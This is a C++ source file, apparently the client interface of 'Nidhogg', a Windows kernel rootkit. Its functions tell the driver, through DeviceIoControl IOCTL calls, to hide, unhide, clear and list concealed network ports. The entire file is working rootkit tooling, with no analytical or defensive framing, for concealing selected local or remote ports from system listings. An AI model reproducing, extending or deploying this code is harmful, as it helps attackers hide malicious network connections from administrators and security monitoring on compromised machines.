#include "pch.h"
#include "Nidhogg.h"

NidhoggErrorCodes NidhoggInterface::HidePort(USHORT portNumber, PortType portType, bool remote) {
	DWORD returned;
	InputHiddenPort hiddenPort{};
	hiddenPort.Hide = true;
	hiddenPort.Port = portNumber;
	hiddenPort.Remote = remote;
	hiddenPort.Type = portType;


	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_PORT,
		&hiddenPort, sizeof(hiddenPort),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}
NidhoggErrorCodes NidhoggInterface::UnhidePort(USHORT portNumber, PortType portType, bool remote) {
	DWORD returned;
	InputHiddenPort hiddenPort{};
	hiddenPort.Hide = false;
	hiddenPort.Port = portNumber;
	hiddenPort.Remote = remote;
	hiddenPort.Type = portType;


	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_PORT,
		&hiddenPort, sizeof(hiddenPort),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ClearHiddenPorts() {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_CLEAR_HIDDEN_PORTS,
		nullptr, 0,
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

std::vector<HiddenPort> NidhoggInterface::QueryHiddenPorts() {
	DWORD returned;
	OutputHiddenPorts rawHiddenPorts{};
	std::vector<HiddenPort> hiddenPorts;
	this->lastError = NIDHOGG_SUCCESS;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_HIDDEN_PORTS,
		nullptr, 0, &rawHiddenPorts, sizeof(rawHiddenPorts), &returned, nullptr)) {

		this->lastError = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
		return hiddenPorts;
	}

	for (USHORT i = 0; i < rawHiddenPorts.PortsCount; i++)
		hiddenPorts.push_back(rawHiddenPorts.Ports[i]);

	return hiddenPorts;
}
